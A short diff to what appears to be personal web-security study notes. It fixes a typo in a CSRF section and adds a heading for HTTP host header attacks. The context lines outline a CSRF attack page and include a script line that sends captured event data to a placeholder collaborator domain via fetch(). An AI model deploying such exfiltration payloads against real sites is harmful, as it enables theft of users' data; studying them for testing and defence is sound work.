@@ -160,7 +160,7 @@ Step 1: Identify 3 conditions:
     1. Relevant Action - Action in the application the attacker wishes to induce
     2. Cookie-based Session Handling - Self explanitory (No Authorization Headers!)
     3. No Unpredictable Request Parameters - CSRF Token / Must know current password to change
-Step 2: Build malicous page to exploits
+Step 2: Build malicous page to exploit
     - Custom:
     <html>
         <body>
@@ -212,3 +212,6 @@ Step 2: Build malicous page to exploits
                 fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
             }
         </script> 
+
+# HTTP Host Header Attacks
+
